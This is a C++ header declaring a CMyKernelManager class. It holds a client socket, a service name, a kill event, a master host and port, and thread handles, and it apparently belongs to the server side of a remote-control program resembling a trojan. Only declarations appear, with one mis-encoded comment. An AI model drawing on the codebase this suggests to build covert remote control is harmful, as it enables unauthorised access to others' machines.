// MyKernelManager.h: interface for the CMyKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MyKernelManager_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_)
#define AFX_MyKernelManager_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000 
#include <tchar.h>
#include "Manager.h"

class CMyKernelManager : public CManager
{
public:
	CMyKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent,
		LPCSTR lpszMasterHost, UINT nMasterPort);
	virtual ~CMyKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	TCHAR	m_strServiceName[256];
	TCHAR	m_strKillEvent[256];

	static	TCHAR	m_strMasterHost[256];
	static	UINT	m_nMasterPort;
	bool	IsActived();
	void Activate()
	{
		InterlockedExchange((LONG *)&m_bIsActived, true);
	}
private:
	HANDLE	m_hThread[2048]; // ◊„πª”√¡À
	UINT	m_nThreadCount;
	DWORD	m_dwServiceType;
	bool	m_bIsActived;
};

#endif // !defined(AFX_MyKernelManager_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_)
